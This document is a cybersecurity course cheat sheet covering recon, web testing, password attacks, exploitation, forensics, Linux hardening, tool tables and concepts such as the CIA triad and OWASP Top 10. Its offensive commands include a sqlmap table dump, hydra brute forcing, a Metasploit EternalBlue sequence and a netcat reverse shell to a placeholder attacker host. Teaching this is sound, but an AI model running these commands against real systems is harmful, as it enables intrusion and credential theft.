# 18. Cybersecurity Cheat Sheet

> Quick reference for commands, tools, concepts, and key terms across all topics.

---

## Commands Quick Reference

### Reconnaissance

```bash
# Passive Recon
whois target.com                                # Domain registration info
dig target.com ANY                              # DNS records
theHarvester -d target.com -b all               # Emails, subdomains
subfinder -d target.com                         # Subdomain enumeration

# Active Recon
nmap -sn 192.168.1.0/24                        # Host discovery (ping sweep)
nmap -sS -sV -O -A -T4 192.168.1.100           # Full scan (SYN + version + OS)
nmap -p- 192.168.1.100                          # All 65535 ports
nmap --script vuln 192.168.1.100                # Vulnerability scripts
```

### Web Application Testing

```bash
# Directory brute force
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
dirb http://target.com

# Web server scanning
nikto -h http://target.com

# SQL Injection (authorized testing only)
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# WordPress scanning
wpscan --url http://wordpress-site.com --enumerate vp,u
```

### Password Attacks

```bash
# Online brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com ssh
hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Login failed"

# Offline hash cracking
john --wordlist=rockyou.txt hashes.txt
john --show hashes.txt

hashcat -m 0 -a 0 md5_hashes.txt rockyou.txt           # MD5
hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt       # NTLM
hashcat -m 1800 -a 0 sha512_hashes.txt rockyou.txt     # SHA-512
```

### Exploitation

```bash
# Metasploit
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
exploit

# Netcat reverse shell
# Attacker: nc -lvnp 4444
# Victim:   nc attacker_ip 4444 -e /bin/bash

# Netcat listener
nc -lvnp 4444
```

### Network Analysis

```bash
# Wireshark display filters
http.request.method == "POST"                   # HTTP POST requests
tcp.flags.syn == 1 && tcp.flags.ack == 0        # SYN scan detection
dns.qry.name == "suspicious.com"                # DNS query filter
ip.addr == 192.168.1.100                        # Filter by IP

# tcpdump
sudo tcpdump -i eth0 -w capture.pcap           # Capture to file
sudo tcpdump -i eth0 port 80 -A                # HTTP traffic ASCII
```

### Cryptography

```bash
# Hashing
echo -n "password" | md5sum
echo -n "password" | sha256sum

# OpenSSL encryption
openssl enc -aes-256-cbc -salt -in file.txt -out file.enc
openssl enc -d -aes-256-cbc -in file.enc -out file.txt

# Generate RSA key pair
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# Check SSL certificate
openssl s_client -connect target.com:443
```

### Linux Security

```bash
# User management
sudo useradd -m username
sudo passwd username
sudo usermod -aG sudo username

# File permissions
chmod 600 sensitive_file                        # Owner read/write only
chmod 755 script.sh                             # Owner rwx, others rx
chown root:root /etc/shadow

# Firewall (UFW)
sudo ufw enable
sudo ufw default deny incoming
sudo ufw allow 22/tcp
sudo ufw status verbose

# Log analysis
grep "Failed password" /var/log/auth.log | tail -20
grep "Accepted" /var/log/auth.log
```

### Forensics

```bash
# Disk imaging
sudo dd if=/dev/sda of=evidence.img bs=4M status=progress

# File analysis
file suspicious_file                            # True file type
strings suspicious_file                         # Readable strings
md5sum evidence.img                             # Hash verification
sha256sum evidence.img

# Memory forensics (Volatility)
volatility -f memory.dmp --profile=Win10x64 pslist
volatility -f memory.dmp --profile=Win10x64 netscan
```

---

## Tools Categorized

| Category | Tool | Purpose |
|----------|------|---------|
| **Scanning** | Nmap | Port/service/OS discovery |
| **Scanning** | Nessus/OpenVAS | Vulnerability scanning |
| **Web Testing** | Burp Suite | Web app proxy and testing |
| **Web Testing** | Nikto | Web server scanning |
| **Web Testing** | Gobuster | Directory brute forcing |
| **Web Testing** | SQLMap | Automated SQL injection |
| **Exploitation** | Metasploit | Exploitation framework |
| **Passwords** | John the Ripper | CPU-based hash cracking |
| **Passwords** | Hashcat | GPU-based hash cracking |
| **Passwords** | Hydra | Online brute forcing |
| **Packets** | Wireshark | Packet capture and analysis |
| **Packets** | tcpdump | CLI packet capture |
| **Networking** | Netcat (nc) | Network utility (shells, transfers) |
| **OSINT** | theHarvester | Email and subdomain recon |
| **OSINT** | Maltego | Visual link analysis |
| **OSINT** | Shodan | Internet device search engine |
| **Wireless** | Aircrack-ng | Wi-Fi security testing |
| **Forensics** | Autopsy | Digital forensics platform |
| **Forensics** | Volatility | Memory forensics |
| **Reverse Eng** | Ghidra | Disassembly/decompilation |
| **SIEM** | Splunk | Log management and analysis |

---

## Key Concepts Quick Reference

### CIA Triad
- **Confidentiality** — Only authorized people can access data
- **Integrity** — Data is accurate and unmodified
- **Availability** — Systems are accessible when needed

### Authentication Factors
- **Something you know** — Password, PIN
- **Something you have** — Phone, token, smart card
- **Something you are** — Fingerprint, face, retina

### Encryption Types
- **Symmetric** — Same key encrypts and decrypts (AES, DES)
- **Asymmetric** — Public key encrypts, private key decrypts (RSA, ECC)
- **Hashing** — One-way transformation, no decryption (SHA-256, bcrypt)

### Attack Lifecycle (Cyber Kill Chain)
1. Reconnaissance → 2. Weaponization → 3. Delivery → 4. Exploitation → 5. Installation → 6. C2 → 7. Actions on Objectives

### OWASP Top 10 (2021)
1. Broken Access Control
2. Cryptographic Failures
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable Components
7. Auth Failures
8. Software/Data Integrity Failures
9. Logging/Monitoring Failures
10. SSRF

### Nmap Scan Types Cheat

| Flag | Scan Type | Root Needed |
|------|-----------|-------------|
| `-sS` | SYN (stealth) | Yes |
| `-sT` | TCP connect | No |
| `-sU` | UDP | Yes |
| `-sV` | Version detection | No |
| `-O` | OS detection | Yes |
| `-A` | Aggressive (all) | Yes |
| `-sn` | Ping sweep (no port scan) | No |
| `-Pn` | Skip ping | No |

### Hashcat Mode Numbers

| Mode | Hash Type |
|------|-----------|
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |
| 1400 | SHA-256 |
| 1800 | SHA-512 (Linux) |
| 3200 | bcrypt |
| 5600 | NetNTLMv2 |

### Common Ports

| Port | Service | Secure Alt |
|------|---------|-----------|
| 21 | FTP | 22 (SFTP) |
| 22 | SSH | — |
| 23 | Telnet | 22 (SSH) |
| 25 | SMTP | 465/587 |
| 53 | DNS | 853 (DoT) |
| 80 | HTTP | 443 (HTTPS) |
| 110 | POP3 | 995 |
| 143 | IMAP | 993 |
| 443 | HTTPS | — |
| 445 | SMB | — |
| 3306 | MySQL | — |
| 3389 | RDP | — |
| 5432 | PostgreSQL | — |

---

> **Next Topic:** [19 - Final Practice Section](19-final-practice-section.md)
